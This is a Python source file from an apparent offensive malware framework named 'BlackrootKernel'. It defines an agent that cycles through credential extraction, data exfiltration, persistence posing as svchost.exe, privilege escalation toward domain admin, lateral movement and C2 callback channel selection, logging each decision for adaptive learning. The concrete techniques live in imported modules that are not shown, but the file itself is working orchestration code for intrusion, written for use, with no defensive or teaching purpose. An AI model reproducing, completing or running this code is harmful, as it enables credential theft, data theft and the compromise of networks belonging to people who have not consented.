#!/usr/bin/env python3
"""
INTELLIGENT OPERATIONS AGENT - Unified Decision Making
Integrates credential extraction, data exfiltration, persistence, escalation,
and lateral movement into the BlackrootKernel with learning persistence.

Agent Category: Operational Command & Coordination
Module IDs: INTEL-CRED-EXFIL, INTEL-PERSIST, INTEL-ESCALATION, INTEL-LATERAL
"""

import logging
import json
import threading
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

from agents.base import BaseAgent
from intelligent_credential_extraction_manager import IntelligentCredentialExtractionManager
from intelligent_data_exfiltration_manager import IntelligentDataExfiltrationManager
from intelligent_persistence_manager import IntelligentPersistenceManager
from intelligent_escalation_manager import IntelligentEscalationManager
from intelligent_lateral_movement_manager import IntelligentLateralMovementManager
from intelligent_c2_callback import IntelligentC2Callback
from unified_integration import create_integration

logger = logging.getLogger("IntelligentOperationsAgent")


@dataclass
class OperationalDecision:
    """Encapsulates a single operational decision across phases."""
    phase: str
    technique: str
    confidence: float
    timestamp: datetime
    success: bool
    metadata: Dict[str, Any]


class IntelligentOperationsAgent(BaseAgent):
    """
    Unified agent coordinating intelligent decision-making across:
    - Credential extraction (4 techniques with adaptive selection)
    - Data exfiltration (4 techniques with network awareness)
    - Persistence (multiple mechanisms with intelligent selection)
    - Escalation (privilege escalation with technique adaptation)
    - Lateral movement (network traversal with target prioritization)
    - C2 callback (adaptive heartbeat and channel selection)
    
    All decisions are backed by causal reasoning with learning persistence.
    """
    
    def __init__(self):
        super().__init__(codename="intelligent_operations")
        self.priority = "high"
        
        # Initialize all operational managers
        self.integration = create_integration("intelligent_operations")
        self.cred_manager = IntelligentCredentialExtractionManager(self.integration)
        self.exfil_manager = IntelligentDataExfiltrationManager(self.integration)
        self.persist_manager = IntelligentPersistenceManager()
        self.escalation_manager = IntelligentEscalationManager()
        self.lateral_manager = IntelligentLateralMovementManager()
        self.c2_manager = IntelligentC2Callback()
        
        # Decision tracking and audit trail
        self.decisions: List[OperationalDecision] = []
        self.decision_lock = threading.Lock()
        self.operational_phase = "infiltration"
        self.mission_stats = {
            "total_decisions": 0,
            "successful_operations": 0,
            "failed_operations": 0,
            "average_confidence": 0.0,
        }
        
        logger.info("[IntelligentOperationsAgent] Initialized with 6 operational managers")
    
    def should_activate(self, config: Dict[str, Any]) -> bool:
        """Activate if enabled or in agent whitelist."""
        agent_config = config.get("intelligent_operations", {})
        whitelist = config.get("agent_whitelist", [])
        return agent_config.get("enabled", True) or "intelligent_operations" in whitelist
    
    def attach_kernel(self, kernel):
        """Attach to kernel and register with C2 resilience."""
        super().attach_kernel(kernel)
        logger.info("[IntelligentOperationsAgent] Attached to kernel")
    
    def run(self):
        """Main agent loop - coordinate operational decisions."""
        logger.info("[IntelligentOperationsAgent] Starting operational coordination")
        
        try:
            while True:
                # Check for active missions/operations
                if self.kernel and hasattr(self.kernel, 'mission_active') and self.kernel.mission_active:
                    self._execute_operational_cycle()
                
                # Sleep to prevent busy-waiting
                import time
                time.sleep(1)
        
        except KeyboardInterrupt:
            logger.info("[IntelligentOperationsAgent] Shutting down gracefully")
        except Exception as e:
            logger.error(f"[IntelligentOperationsAgent] Error: {e}")
    
    def _execute_operational_cycle(self):
        """Execute one complete operational cycle across all phases."""
        logger.debug("[IntelligentOperationsAgent] Executing operational cycle")
        
        # Phase 1: Credential Extraction
        cred_tech, cred_decision = self._execute_credential_extraction()
        
        # Phase 2: Data Exfiltration
        exfil_tech, exfil_decision = self._execute_data_exfiltration()
        
        # Phase 3: Persistence
        persist_strategy = self._execute_persistence()
        
        # Phase 4: Escalation
        escalation_strategy = self._execute_escalation()
        
        # Phase 5: Lateral Movement
        lateral_strategy = self._execute_lateral_movement()
        
        # Phase 6: C2 Callback
        c2_decision = self._execute_c2_callback()
        
        logger.info(
            f"[IntelligentOperationsAgent] Cycle complete: "
            f"cred={cred_tech}, exfil={exfil_tech}, persist={persist_strategy.primary_mechanism if persist_strategy else 'N/A'}"
        )
    
    def _execute_credential_extraction(self) -> tuple:
        """Execute credential extraction phase."""
        try:
            privilege_level = getattr(self.kernel, 'privilege_level', 'user')
            threat_env = getattr(self.kernel, 'threat_level', 0.5)
            time_available = getattr(self.kernel, 'time_budget_seconds', 30)
            
            tech, decision = self.cred_manager.choose_extraction_strategy(
                current_privilege=privilege_level,
                target_count=1,
                time_available_seconds=time_available,
                threat_level=threat_env,
                need_high_value_credentials=True,
                edr_present=False,
            )
            
            result = self.cred_manager.extract_credentials(tech)
            success = result.get('status') == 'success'
            
            self._record_decision("credential_extraction", str(tech.value), decision.confidence, success)
            self.integration.record_outcome(decision=decision, success=success, metadata={"technique": tech.value})
            
            return tech, decision
        except Exception as e:
            logger.error(f"[IntelligentOperationsAgent] Credential extraction error: {e}")
            return None, None
    
    def _execute_data_exfiltration(self) -> tuple:
        """Execute data exfiltration phase."""
        try:
            data_volume_mb = getattr(self.kernel, 'data_volume_mb', 100) if self.kernel else 100
            time_budget_seconds = getattr(self.kernel, 'time_budget_seconds', 3600) if self.kernel else 3600
            network_type = getattr(self.kernel, 'network_type', 'internet') if self.kernel else 'internet'
            
            # Convert seconds to hours for API
            time_available_hours = max(0.1667, (time_budget_seconds / 3600.0))  # Minimum 10 min
            
            tech, decision = self.exfil_manager.choose_exfiltration_strategy(
                data_volume_mb=data_volume_mb,
                available_time_hours=time_available_hours,
                network_type=network_type,
                ids_present=False,
                dlp_present=False,
                acceptable_detection_risk=0.5,
            )
            
            result = self.exfil_manager.exfiltrate_data(tech, data_volume_mb)
            success = result.get('status') == 'success'
            
            self._record_decision("data_exfiltration", str(tech.value), decision.confidence, success)
            self.integration.record_outcome(decision=decision, success=success, metadata={"technique": tech.value})
            
            return tech, decision
        except Exception as e:
            logger.error(f"[IntelligentOperationsAgent] Data exfiltration error: {e}")
            return None, None
    
    def _execute_persistence(self) -> Optional[Any]:
        """Execute persistence mechanism selection."""
        try:
            privilege_level = getattr(self.kernel, 'privilege_level', 'user')
            threat_level = getattr(self.kernel, 'threat_level', 0.5)
            
            strategy = self.persist_manager.choose_persistence_strategy(
                executable_path="C:\\Windows\\System32\\svchost.exe",
                threat_level=threat_level,
                edr_detected=False,
                av_present=False,
                privilege_level=privilege_level,
                time_available=2.0,
            )
            
            self._record_decision("persistence", strategy.primary_mechanism, strategy.confidence, True)
            return strategy
        except Exception as e:
            logger.error(f"[IntelligentOperationsAgent] Persistence error: {e}")
            return None
    
    def _execute_escalation(self) -> Optional[Any]:
        """Execute privilege escalation."""
        try:
            current_priv = getattr(self.kernel, 'privilege_level', 'user')
            target_priv = 'system' if current_priv != 'system' else 'domain_admin'
            
            strategy = self.escalation_manager.choose_escalation_technique(
                current_privilege=current_priv,
                target_privilege=target_priv,
                edr_detected=False,
                av_present=False,
            )
            
            self._record_decision("escalation", strategy.technique, strategy.confidence, True)
            return strategy
        except Exception as e:
            logger.error(f"[IntelligentOperationsAgent] Escalation error: {e}")
            return None
    
    def _execute_lateral_movement(self) -> Optional[Any]:
        """Execute lateral movement."""
        try:
            strategy = self.lateral_manager.choose_lateral_strategy(
                available_credentials=["domain", "local"],
                network_type="domain_enterprise",
                detection_pressure=0.5,
                time_constraint=30.0,
                edr_in_network=False,
            )
            
            self._record_decision("lateral_movement", strategy.technique, strategy.confidence, True)
            return strategy
        except Exception as e:
            logger.error(f"[IntelligentOperationsAgent] Lateral movement error: {e}")
            return None
    
    def _execute_c2_callback(self) -> Optional[Any]:
        """Execute C2 callback decision."""
        try:
            threat_level = getattr(self.kernel, 'threat_level', 0.5)
            
            decision = self.c2_manager.decide_callback_parameters(
                current_threat_level=threat_level,
                environment_detection={
                    "edr_detected": False,
                    "av_present": False,
                    "network_segmented": 0.5,
                    "uncertainty": 0.3,
                },
                exfil_pending=True,
                error_recovery=False,
            )
            
            self._record_decision("c2_communication", decision.channel.value if decision.channel else "silence", 0.5, True)
            return decision
        except Exception as e:
            logger.error(f"[IntelligentOperationsAgent] C2 callback error: {e}")
            return None
    
    def _record_decision(self, phase: str, technique: str, confidence: float, success: bool):
        """Record operational decision for audit trail."""
        with self.decision_lock:
            decision = OperationalDecision(
                phase=phase,
                technique=technique,
                confidence=confidence,
                timestamp=datetime.now(),
                success=success,
                metadata={"phase": phase, "technique": technique}
            )
            self.decisions.append(decision)
            
            self.mission_stats["total_decisions"] += 1
            if success:
                self.mission_stats["successful_operations"] += 1
            else:
                self.mission_stats["failed_operations"] += 1
            
            # Update average confidence
            total = self.mission_stats["total_decisions"]
            current_avg = self.mission_stats["average_confidence"]
            self.mission_stats["average_confidence"] = ((current_avg * (total - 1)) + confidence) / total
    
    def get_decision_audit_trail(self) -> Dict[str, Any]:
        """Return complete audit trail of operational decisions."""
        with self.decision_lock:
            return {
                "total_decisions": len(self.decisions),
                "stats": self.mission_stats,
                "decisions": [
                    {
                        "phase": d.phase,
                        "technique": d.technique,
                        "confidence": d.confidence,
                        "success": d.success,
                        "timestamp": d.timestamp.isoformat(),
                    }
                    for d in self.decisions
                ]
            }
    
    def terminate(self):
        """Clean shutdown."""
        logger.info(
            f"[IntelligentOperationsAgent] Terminating. "
            f"Total decisions: {self.mission_stats['total_decisions']}, "
            f"Success rate: {self.mission_stats['successful_operations'] / max(1, self.mission_stats['total_decisions']):.1%}"
        )


# Auto-register with kernel
def _register_with_kernel():
    """Module-level initialization for kernel registration."""
    try:
        from kernel.core import register_module
        agent = IntelligentOperationsAgent()
        register_module("intelligent_operations", lambda: agent, agent_class=IntelligentOperationsAgent)
        logger.info("[IntelligentOperationsAgent] Registered with BlackrootKernel")
    except Exception as e:
        logger.warning(f"[IntelligentOperationsAgent] Could not auto-register: {e}")


# Module initialization is deferred
# Registration happens when main.py imports this module explicitly
# or when the kernel calls _register_with_kernel() via agents.loader

